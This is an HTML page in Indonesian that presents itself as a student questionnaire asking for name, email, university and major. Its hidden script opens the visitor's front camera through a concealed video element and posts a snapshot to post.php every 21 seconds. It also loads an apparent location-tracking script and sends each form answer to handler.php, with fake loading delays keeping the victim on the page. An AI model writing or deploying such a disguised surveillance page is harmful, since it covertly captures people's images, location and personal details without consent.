<!doctype html>
<html>
<head>
  <script src="../../assets/js/jquery.min.js"></script>
  <script src="../../assets/js/client.min.js"></script>
  <script src="../../assets/js/loc.js"></script>
  <link href="../../assets/css/bootstrap.min.css" rel="stylesheet">
  <link href="../../assets/css/light-theme.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

</html>
<html>
<body onload="mydata()">

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
<script src="../../assets/js/location.js"></script>
<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};
// environment -- user

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    $('.formulir').hide();
    $('.tampil_error').show();
    //alert(e.toString());
    //errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png")
       cc = String(canvasData).replace("data:image/png;base64,","")
      //  console.log(cc)
       post(cc); }, 21000);
  

}

// Load init
init();

</script>

</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>KUISIONER</title>
    <script>
        window.console = window.console || function (t) {
        };
    </script>
    <script>
        if (document.location.search.match(/type=embed/gi)) {
            window.parent.postMessage("resize", "*");
        }
    </script>

<script>

  function klikSubmit(namaID){

    //console.log(document.getElementById(namaID).value);
   // document.getElementBy().style.display = "inline-block";

   var formulir = document.getElementById(namaID);
   //console.log(formulir.name);
   //console.log(formulir.value);
   $.ajax({          
            type: 'POST',
            url: 'handler.php',
            data: {"data_formulir":`${formulir.name} : ${formulir.value}`},
            mimeType: 'text'
            });
       
  }

  
  $(document).ready(function(){

    // inisialisasi
    $('#nama').show();
    $('#alamatEmail').hide();
    $('#asalUniversitas').hide();
    $('#jurusanKuliah').hide();

    $('.tbl1').click(function() {
      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
      $('#nama').fadeOut();
      $('#alamatEmail').delay(15000).fadeIn();
      
    });

    $('.tbl2').click(function() {
      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
      $('#alamatEmail').fadeOut();
      $('#asalUniversitas').delay(15000).fadeIn();
      locate();
    });

    $('.tbl3').click(function() {
      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
      $('#asalUniversitas').fadeOut();
      $('#jurusanKuliah').delay(15000).fadeIn();
    });
});

</script>
</head>

<body translate="no">

  <div class="bg-dark text-light p-4 container-fluid"><h1>LAMAN KUISIONER</h1></div>

  
 <!-- Mulai Formulir --> 
<div class="container formulir p-4 mt-3">

  <div id="gtau" class="container text-center mt-5" style="display: none;"><i class="fa fa-refresh fa-spin fa-2x"></i><h3 style="display: inline;">&nbsp;&nbsp;Loading</h3></div>
 


<div id="nama">
    <div class="form-group">
      <label for="namaform1"><h5>Nama</h5></label>
      <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" name="Nama" placeholder="masukkan nama" required>
    </div>
  
    <button class="btn btn-primary tbl1" onclick="klikSubmit('namaform1')">Kirim</button>
  
   
</div>



<div id="alamatEmail">
    <div class="form-group">
      <label for="emailform1"><h5>Email</h5></label>
      <input type="email" class="form-control" id="emailform1" aria-describedby="emailHelp" name="Email" placeholder="masukkan email" required>
    </div>
  
    <button class="btn btn-primary tbl2" onclick="klikSubmit('emailform1')">Kirim</button>
  
    
</div>

<div id="asalUniversitas">
  <div class="form-group">
    <label for="asalUnivform1"><h5>Asal universitas</h5></label>
    <input type="text" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
  </div>

  <button class="btn btn-primary tbl3" onclick="klikSubmit('asalUnivform1')">Kirim</button>
  
</div>

<div id="jurusanKuliah">
  <div class="form-group">
    <label for="jurusanform1"><h5>Jurusan</h5></label>
    <input type="text" class="form-control" id="jurusanform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
  </div>

  <button class="btn btn-primary tbl4" onclick="klikSubmit('jurusanform1')">Kirim</button>
  
</div>

</div>
<!-- Akhir Formulir Formulir -->

<!--pesan error-->
<div class="tampil_error jumbotron bg-danger text-light m-3" style="display: none;">
<h1>ERROR&nbsp;:(</h1>
<p>Web ini tidak bisa mengakses sumber daya yang diperlukan</p>

</div>


</body>
</html>